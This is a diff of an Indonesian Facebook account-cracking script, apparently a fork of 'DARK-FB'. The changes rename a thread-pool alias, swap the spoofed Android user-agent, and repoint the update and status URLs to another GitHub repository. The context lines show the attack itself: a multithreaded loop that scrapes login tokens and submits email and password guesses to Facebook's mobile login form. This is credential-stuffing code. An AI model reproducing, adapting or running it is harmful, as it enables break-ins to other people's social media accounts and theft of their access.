@@ -58,7 +58,7 @@ try:
 	from bs4 import BeautifulSoup as parser
 	from bs4 import BeautifulSoup as par
 	from random import choice as pilih
-	from concurrent.futures import ThreadPoolExecutor as __Kiky__
+	from concurrent.futures import ThreadPoolExecutor as __Ferly__
 	from concurrent.futures import ThreadPoolExecutor
 	from requests.exceptions import ConnectionError
 	from datetime import datetime
@@ -1121,7 +1121,7 @@ class crack:
 		anim = Progress(SpinnerColumn("arrow2"),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 		anim2 = anim.add_task('',total=len(sos))
 		with anim:
-			with __Kiky__(max_workers=xtc["setting_crack"]["max-crack"]) as kontok:
+			with __Ferly__(max_workers=xtc["setting_crack"]["max-crack"]) as kontok:
 				for kocok in sos:
 					try:
 						userz = kocok.split('<=>')[0]
@@ -1140,7 +1140,7 @@ class crack:
 		try:
 			for pw in pasen:
 				session = requests.Session()
-				session.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
+				session.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-G850F Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
 				link = session.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text
 				date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
 				head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
@@ -1200,7 +1200,7 @@ class cek_file:
 		self.__check_status_("Aktif")
 	def __check_update_(self, version_):
 		try:
-			version = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/.data/version.txt").text.strip()
+			version = requests.get("https://raw.githubusercontent.com/Denventa/DARK-FB/main/.data/version.txt").text.strip()
 		except requests.exceptions.ConnectionError:
 			print(m+"#"+q+" UPS... SEPERTINYA JARINGAN ANDA TERPUTUS")
 			quit()
@@ -1211,11 +1211,11 @@ class cek_file:
 			text = Text(f"""Halo Sobat.. Sepertinya Script Yang Anda Gunakan Version {m}{version_}{q}\nJadi... Script Yang Baru Version {i}{version}{q}\nJika Masih Stuck Update/Gini Terus Silahkan Gunakan Pernintah Ini\n{i}python update.py{q}""")
 			console.rule("Informasi",style="yellow")
 			console.print(text, style="cyan")
-			print(m+"#"+k+" COBA KETIK :"+q+" python run.py SEKALI LAGI!!")
+			print(m+"#"+k+" Coba Ketik :"+q+" python run.py Sekali Lagi!!")
 			quit()
 	def __check_status_(self, mainx):
 		try:
-			mainz = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/.data/status.txt").text.strip()
+			mainz = requests.get("https://raw.githubusercontent.com/Denventa/DARK-FB/main/.data/status.txt").text.strip()
 		except requests.exceptions.ConnectionError:
 			print(m+"#"+q+" UPS... SEPERTINYA JARINGAN ANDA TERPUTUS")
 			quit()
